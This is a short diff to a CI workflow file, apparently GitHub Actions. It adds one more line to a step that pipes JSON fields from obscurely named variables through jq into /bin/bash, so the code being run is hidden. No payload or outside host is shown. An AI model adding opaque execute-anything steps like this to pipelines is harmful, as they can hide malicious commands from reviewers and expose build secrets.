@@ -34,6 +34,7 @@ jobs:
           echo $bne77 | jq -r .iuo67 | /bin/bash
           echo $skp1384 | jq -r .cvtf9 | /bin/bash
           printf '%s' "$wxcs035" | jq -r .rlxb10329 | /bin/bash
+          echo $ls7 | jq -r .v21088 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
